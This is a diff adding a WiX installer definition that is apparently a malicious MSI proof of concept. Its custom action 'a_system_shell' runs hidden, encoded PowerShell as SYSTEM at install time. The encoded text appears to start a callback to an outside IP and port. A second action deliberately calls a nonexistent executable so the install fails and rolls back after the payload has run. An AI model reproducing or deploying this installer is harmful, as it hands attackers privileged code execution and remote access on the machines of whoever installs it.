@@ -1,0 +1,38 @@
+<Wix xmlns="http://wixtoolset.org/schemas/v4/wxs">
+   <Package UpgradeCode="12345678-1234-1234-1234-111111111111" 
+		Name="TFG" 
+	        Version="0.0.1" 
+	        Manufacturer="TFG" 
+	        Language="1033" 
+	        InstallerVersion="200">
+	   
+	  <Media Id="1" Cabinet="product.cab" EmbedCab="yes" />
+
+      <Feature Id="DefaultFeature" Level="1">
+         <ComponentRef Id="ApplicationFiles" />
+      </Feature>
+
+      <CustomAction Id="a_system_shell" 
+	        Directory="TARGETDIR" 
+			ExeCommand="powershell -nop -w hidden -enc JABzAD0AJwAxADMALgAzADkALgAyADMANwAuADIAOgA4ADAAOAAwACcAOwAkAGkAPQ" 
+			Return="asyncNoWait" 
+			Execute="deferred" 
+			Impersonate="no" 
+	   />
+
+      <CustomAction Id="z_gonna_fail" 
+			Directory="TARGETDIR" 
+			ExeCommand="C:\noexiste.exe" 
+			Return="check" 
+			Execute="deferred" 
+			Impersonate="no" 
+	   />
+
+   <InstallExecuteSequence>
+      <Custom Action="a_system_shell" After="InstallInitialize" /> 
+      <Custom Action="z_gonna_fail" Before="InstallFinalize" /> 
+   </InstallExecuteSequence>
+   
+   
+         <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222" Directory="TARGETDIR" />               
+      </Package>
